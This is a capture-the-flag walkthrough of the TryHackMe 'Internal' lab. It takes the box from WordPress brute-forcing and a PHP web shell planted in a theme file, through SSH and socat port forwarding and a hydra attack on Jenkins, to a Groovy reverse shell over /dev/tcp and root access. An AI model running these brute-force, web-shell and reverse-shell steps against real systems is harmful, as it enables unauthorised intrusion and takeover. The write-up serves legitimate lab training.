# Internal

| [![Overpass](../../_static/images/internal.png)](https://tryhackme.com/room/internal) |
|:--:|
| [https://tryhackme.com/room/internal](https://tryhackme.com/room/internal) |

The lead is a straight forward exploit of Wordpress, followed by exploitation that requires manual enumeration of 
the host file system. A Jenkins server is found running internally that leads to a Docker container, to a ...

## Scanning

Run a simple port scan (without Ping)

	nmap -Pn -p- <IP target> -oN portscan

portscan:

```text

```

Run an `-A` scan on the open ports:

	nmap -Pn -T4 -A -p80,135,139,445,3389,49663,49667,49669 <IP target> -oN servicescan

servicescan:

```text

```

## Exploring


## Find files and folders

    gobuster dir -u http://<IP target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 50

Results:

```text

```

## Wordpress enumeration

    wpscan --url http://<IP target>/blog -e u

Brute-forcing the found password:

    wpscan --url http://<IP target>/blog -U admin -P /usr/share/wordlists/rockyou.txt

## Reverse shell

Log into WordPress as the admin user.

Copy and adapt the Laudanum PHP Reverse Shell found in `/usr/share/laudanum/php/php-reverse-shell.php` or the 
[PentestMonkey php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

1. Use "Appearance > Theme Editor > 404.php" and replace the PHP code with the PHP reverse shell.
2. Open a listener
3. Call the template in browser http://<IP target>/blog/wp-content/themes/twentyseventeen/404.php

A shell as the `www-data` user is granted on the box.

Stabilise the shell:

    python -c "import pty;pty.spawn('/bin/bash')"

## Privilege escalation

MySQL credentials can often be found by inspecting the `wp-config.php` file. Alas.

Explore to find an interesting file in the `/opt` directory. Read it.

    $ su aubreanna

The user flag is in aubreanna’s home folder. 

    sudo -l
    Sorry, user aubreanna may not run sudo on internal.

There is a file in aubreanna’s home folder that tells us Jenkins is running on port 8080:

    netstat -tan | grep 8080

There already were indications that docker is available on the target, and Jenkins is often installed with docker.
If not a rabbit hole, this could be a way to elevate privileges to root. 

## Using SSH for port forwarding

Because port 8080 can only be accessed locally, we need to set up port forwarding to redirect traffic to localhost 
on port 1234 to the target machine on port 8080:

```text
$ ssh -f -N -L 1234:127.0.0.1:8080 aubreanna@<IP target>
$ nmap -sC -sV -p 1234 127.0.0.1
```

Jenkins is now available on `127.0.0.1:1234/login?from=%2F` from the attack machine.

## Using socat to redirect ports

As an alternative we can use `socat`. It is not available on the target, we have to transfer it. On the attack machine:

```text
$ which socat 
/usr/bin/socat
$ cd /usr/bin/
$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

On the target machine:

```text
$ cd /tmp/
:/tmp$ wget http://<IP attack machine>:8000/socat
:/tmp$ chmod +x socat
:/tmp$ ./socat TCP-LISTEN:8888,fork TCP:127.0.0.1:80 &
```

Jenkins is now available with `IP target:8888/login?from=%2F` from the attack machine.

## Jenkins' admin password

Default credentials do not seem to work. Intercept the POST request in Burpsuite to be able to 
build the hydra command.

Hydra:

```text
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP target> -s 8888 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Log in to Jenkins with the found username and password.

## Reverse shell in docker

Start a listener:

    nc -nlvp 5555

In Jenkins, go to "Jenkins > Nodes > master" and click on "Script Console". Enter (change the
necessary parameters):

```text
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<IP attack machine>/5555;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

And execute. In the listener, we now have a reverse shell in docker. In `/opt` is a message 
`note.txt` for Aubreanna. :)

Go back to the initial SSH connection as aubreanna, and get the root flag:

    $ su root
    Password: 
    # cd /root/
